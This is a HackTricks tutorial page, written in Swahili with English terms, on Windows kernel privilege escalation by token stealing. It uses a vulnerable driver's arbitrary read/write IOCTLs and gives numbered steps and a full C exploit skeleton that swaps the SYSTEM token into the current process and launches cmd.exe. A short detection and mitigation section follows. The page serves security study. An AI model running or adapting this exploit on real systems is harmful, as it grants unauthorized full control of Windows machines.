# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari

Ikiwa vulnerable driver inafichua IOCTL inayompa attacker primitives za kusoma na/au kuandika kernel kiholela, kuinua privileges hadi NT AUTHORITY\SYSTEM mara nyingi kunaweza kufanikishwa kwa kuiba SYSTEM access token. Technique hii inakili Token pointer kutoka EPROCESS ya SYSTEM process hadi EPROCESS ya current process.<sup>[[2]](#references)</sup>

Kwa nini inafanya kazi:
- Kila process ina muundo wa EPROCESS ambao una, miongoni mwa fields nyingine, Token (ambayo kwa hakika ni EX_FAST_REF inayoelekeza kwenye token object).
- SYSTEM process (PID 4) ina token yenye privileges zote zikiwa enabled.
- Kubadilisha current process’ EPROCESS.Token na SYSTEM token pointer hufanya current process iendeshe kama SYSTEM mara moja.<sup>[[1]](#references)</sup>

> Offsets katika EPROCESS hubadilika kulingana na Windows versions. Ziamue dynamically (symbols) au tumia version-specific constants. Pia kumbuka kuwa EPROCESS.Token ni EX_FAST_REF (bits 3 za chini ni reference count flags).

## Hatua za kiwango cha juu

1) Tafuta ntoskrnl.exe base na resolve address ya PsInitialSystemProcess.
- Kutoka user mode, tumia NtQuerySystemInformation(SystemModuleInformation) au EnumDeviceDrivers kupata driver bases zilizopakiwa.
- Ongeza offset ya PsInitialSystemProcess (kutoka symbols/reversing) kwenye kernel base ili kupata address yake.
2) Soma pointer iliyo kwenye PsInitialSystemProcess → hii ni kernel pointer inayoelekeza kwenye SYSTEM’s EPROCESS.
3) Kutoka SYSTEM EPROCESS, soma offsets za UniqueProcessId na ActiveProcessLinks ili kupitia doubly linked list ya EPROCESS structures (ActiveProcessLinks.Flink/Blink) hadi upate EPROCESS ambayo UniqueProcessId yake inalingana na GetCurrentProcessId(). Hifadhi zote mbili:
- EPROCESS_SYSTEM (ya SYSTEM)
- EPROCESS_SELF (ya current process)
4) Soma SYSTEM token value: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Ondoa bits 3 za chini: Token_SYS_masked = Token_SYS & ~0xF (mara nyingi ~0xF au ~0x7 kulingana na build; kwenye x64 bits 3 za chini hutumika — 0xFFFFFFFFFFFFFFF8 mask).
5) Option A (common): Hifadhi bits 3 za chini kutoka kwenye current token yako na uziongeze kwenye pointer ya SYSTEM ili kuweka embedded ref count ikiwa consistent.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Andika Token_NEW tena kwenye (EPROCESS_SELF + TokenOffset) ukitumia kernel write primitive yako.
7) Current process yako sasa ni SYSTEM. Kwa hiari, spawn cmd.exe au powershell.exe mpya ili kuthibitisha.<sup>[[1]](#references)</sup>

## Pseudocode

Chini kuna skeleton inayotumia IOCTL mbili pekee kutoka kwa vulnerable driver, moja kwa kernel read ya 8-byte na nyingine kwa kernel write ya 8-byte. Badilisha kulingana na interface ya driver yako.<sup>[[1]](#references)</sup>
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Notes:
- Offsets: Tumia WinDbg’s `dt nt!_EPROCESS` pamoja na PDBs za target, au runtime symbol loader, ili kupata offsets sahihi. Usiziweke hardcode bila kuthibitisha.
- Mask: Kwenye x64, token ni EX_FAST_REF; bits 3 za chini ni reference count bits. Kuhifadhi bits za chini za awali kutoka kwenye token yako huepuka refcount inconsistencies za mara moja.
- Stability: Pendelea ku-elevate process ya sasa; ukielevate helper ya muda mfupi, unaweza kupoteza SYSTEM inapotoka.<sup>[[1]](#references)</sup>

## Detection & mitigation
- Kupakia unsigned au third-party drivers zisizoaminika zinazofichua IOCTLs zenye nguvu ndilo chanzo kikuu.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard, na Attack Surface Reduction rules zinaweza kuzuia vulnerable drivers kupakiwa.
- EDR inaweza kufuatilia suspicious IOCTL sequences zinazotekeleza arbitrary read/write na token swaps.

## References

- [1] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) na kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [2] [FuzzySecurity – Windows Kernel ExploitDev (mifano ya token stealing)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
